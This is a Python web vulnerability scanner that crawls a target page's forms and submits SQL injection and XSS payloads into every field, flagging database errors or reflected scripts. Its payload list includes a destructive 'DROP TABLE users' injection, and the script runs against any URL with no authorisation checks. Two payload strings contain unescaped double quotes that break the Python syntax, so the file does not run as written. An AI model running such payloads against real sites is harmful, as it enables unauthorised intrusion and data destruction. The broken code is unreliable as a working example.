import requests
from bs4 import BeautifulSoup

# Define the target URL
TARGET_URL = "http://example.com"

# Payloads for SQL Injection and XSS
SQL_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1"; DROP TABLE users; --",
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src='x' onerror='alert("XSS")'>",
]

# Function to crawl and find forms on a webpage
def crawl_and_find_forms(target_url):
    try:
        response = requests.get(target_url)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        print(f"[INFO] Found {len(forms)} forms on {target_url}")
        return forms
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Failed to crawl {target_url}: {e}")
        return []

# Function to extract form details
def extract_form_details(form):
    action = form.get('action')
    method = form.get('method', 'get').lower()
    inputs = form.find_all('input')
    form_details = {
        "action": action,
        "method": method,
        "inputs": [
            {
                "name": input_tag.get('name'),
                "type": input_tag.get('type', 'text')
            } for input_tag in inputs
        ]
    }
    return form_details

# Function to test for SQL Injection
def test_sql_injection(target_url, forms):
    print("[INFO] Testing for SQL Injection...")
    for form in forms:
        form_details = extract_form_details(form)
        for payload in SQL_PAYLOADS:
            data = {}
            for input_field in form_details['inputs']:
                if input_field['type'] != 'submit':
                    data[input_field['name']] = payload
            target = target_url + form_details['action']
            try:
                if form_details['method'] == 'post':
                    response = requests.post(target, data=data)
                else:
                    response = requests.get(target, params=data)
                if "SQL syntax" in response.text or "database error" in response.text:
                    print(f"[VULNERABILITY] SQL Injection detected on {target} with payload: {payload}")
            except requests.exceptions.RequestException as e:
                print(f"[ERROR] Failed to test SQL Injection: {e}")

# Function to test for XSS
def test_xss(target_url, forms):
    print("[INFO] Testing for XSS...")
    for form in forms:
        form_details = extract_form_details(form)
        for payload in XSS_PAYLOADS:
            data = {}
            for input_field in form_details['inputs']:
                if input_field['type'] != 'submit':
                    data[input_field['name']] = payload
            target = target_url + form_details['action']
            try:
                if form_details['method'] == 'post':
                    response = requests.post(target, data=data)
                else:
                    response = requests.get(target, params=data)
                if payload in response.text:
                    print(f"[VULNERABILITY] XSS detected on {target} with payload: {payload}")
            except requests.exceptions.RequestException as e:
                print(f"[ERROR] Failed to test XSS: {e}")

# Main function to run the scanner
def main():
    print(f"[INFO] Starting vulnerability scanner for {TARGET_URL}")
    forms = crawl_and_find_forms(TARGET_URL)
    if forms:
        test_sql_injection(TARGET_URL, forms)
        test_xss(TARGET_URL, forms)
    else:
        print("[INFO] No forms found. Scanning terminated.")

if __name__ == "__main__":
    main()
